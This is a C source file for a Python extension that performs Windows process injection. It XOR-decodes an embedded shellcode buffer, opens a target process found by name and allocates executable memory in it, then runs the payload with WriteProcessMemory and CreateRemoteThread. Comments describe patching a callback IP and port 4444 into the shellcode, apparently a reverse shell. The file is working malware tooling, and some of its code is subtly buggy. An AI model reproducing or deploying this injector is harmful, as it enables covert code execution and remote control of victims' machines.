#include "processInjection.h"

char* unencrypt(const char* bytes, size_t length){
    unsigned char key = bytes[length - 1];
    unsigned char *dec_bytes = (char *)malloc(sizeof(char) * length - 1);
    for(int i = 0; i < length - 1; i++){
        dec_bytes[i] = bytes[i] ^ key;
    }

    return dec_bytes;
}

char* customizeRemote(const char* bytes, const char* ip_bytes, const char* port_bytes){
    // Finds default ip \xac\x1c\x25\xad (172.28.37.173) and changes it to ip_bytes
    // Finds default port \x11\x5c (4444) and changes it to port_bytes
    return NULL;
}

HANDLE findProcessByName(LPCWSTR targetName){
	// Searches through the running process and compares their names to the one provided returning a HANDLE to that 
	// process if it is found or NULL if it is not

	DWORD processList[1024], bytesNeeded, numOfProcess;
	HANDLE curProcess;
	HMODULE moduleHolder;
	DWORD otherBytesNeeded;
	LPWSTR name = (LPWSTR)malloc(sizeof(wchar_t) * 1024);
	
	EnumProcesses(processList, sizeof(processList), &bytesNeeded);
	numOfProcess = bytesNeeded / sizeof(DWORD);

	for (DWORD i = 0; i < numOfProcess; i++) {
		curProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processList[i]);
		if (0 == curProcess)
			continue;
		
		if (EnumProcessModules(curProcess, &moduleHolder, sizeof(moduleHolder), &otherBytesNeeded)) {
			GetModuleBaseName(curProcess, moduleHolder, name, 1024);
		}

		if (strcmp(name, targetName) == 0) {
			return curProcess;
		}

		CloseHandle(curProcess);
	}

	return NULL;
}

static PyObject* procinj_injectIntoProcessByName(PyObject *self, PyObject *args){
    const char* procName;
    unsigned char* unenc;
    unsigned char buf[] = SHELLCODE1;
    size_t length = sizeof(buf) - 1, returner;
    HANDLE remoteThread, processHandle;
    PVOID remoteBuffer;

    /*if(!PyArg_ParseTuple(args, "sy#", &procName, &buf, &length)){
        return NULL;
    }*/

    if(!PyArg_ParseTuple(args, "s", &procName)){
        return NULL;
    }

    unenc = unencrypt(buf, length);
    if(NULL == (processHandle = findProcessByName(procName))){
        PyErr_SetString(PyExc_ProcessLookupError, "Proc with name not found");
        return NULL;
    }
    
    remoteBuffer = VirtualAllocEx(processHandle, NULL, length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if(0 == remoteBuffer){
        PyErr_SetString(PyExc_PermissionError, "Unable to allocate memory in target proc");
        return NULL;
    }

    WriteProcessMemory(processHandle, remoteBuffer, unenc, length, &returner);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    free(unenc);
    Py_RETURN_TRUE;
}